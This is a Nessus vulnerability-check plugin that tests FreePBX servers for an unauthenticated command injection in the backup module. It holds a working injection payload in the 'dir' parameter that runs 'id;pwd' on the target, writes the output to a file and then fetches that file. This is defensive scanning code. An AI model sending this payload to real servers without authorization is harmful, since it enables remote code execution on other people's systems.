#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66986);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/02/05 20:54:01 $");

  script_bugtraq_id(59533);
  script_osvdb_id(92856);

  script_name(english:"FreePBX Backup Module page.backup.php 'dir' Parameter RCE");
  script_summary(english:"Tries to run an arbitrary command.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that allows arbitrary command
execution.");
  script_set_attribute(attribute:"description", value:
"The version of FreePBX hosted on the remote web server is affected by
a remote command injection vulnerability due to a weakness in the
'strpos' function when sanitizing user-supplied input to the 'dir'
parameter in 'page.backup.php'. A remote, unauthenticated attacker can
exploit this issue to execute arbitrary commands on the remote host,
subject to the privileges of the web server user.");
  # http://packetstormsecurity.com/files/121438/FreePBX-2.9-Remote-Command-Execution.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c5161e47");
  script_set_attribute(attribute:"solution", value:"Upgrade FreePBX to version 2.10 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/04/27");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/04/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/06/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:freepbx:freepbx");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("freepbx_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "installed_sw/FreePBX");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = 'FreePBX';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port,qs:dir);

cmd = 'id';
cmd_pat =  "uid=[0-9]+.*gid=[0-9]+.*";


token = SCRIPT_NAME - ".nasl" + "-" + unixtime();
attack = "/admin/modules/backup/page.backup.php?action=deletedataset&" +
  "dir=';echo%20`id;pwd`>" + token + ".txt;echo%20'nessus";


res = http_send_recv3(
  method       : "GET",
  item         : dir + attack,
  port         : port,
  exit_on_fail : TRUE
);
attack_req = install_url + attack;
vuln = FALSE;

if (">Add Backup" >< res[2] && ">Restore from Backup<" >< res[2])
{
  # Attempt to view the file we created
  url = "admin/modules/backup/" + token + ".txt";

  res2 = http_send_recv3(
    method       : "GET",
    item         : dir + "/" + url,
    port         : port,
    exit_on_fail : TRUE
  );

  if (egrep(pattern:cmd_pat, string:res2[2]))
    vuln = TRUE;

  verify_req = install_url + "/" + url;
}
if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, "FreePBX", install_url);

path = strstr(res2[2], "/");
rep_extra =
  'Note that this request created a file that will need to be manually' +
  '\nremoved (' +chomp(path)+ '/' + token + '.txt).';

# Extract command output for reporting
pos = stridx(res2[2], "/");
output = substr(res2[2], 0, pos-1);
if (empty_or_null(output)) output = res2[2];

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  cmd         : cmd,
  line_limit  : 2,
  request     : make_list(attack_req, verify_req),
  output      : chomp(output),
  rep_extra   : rep_extra
);
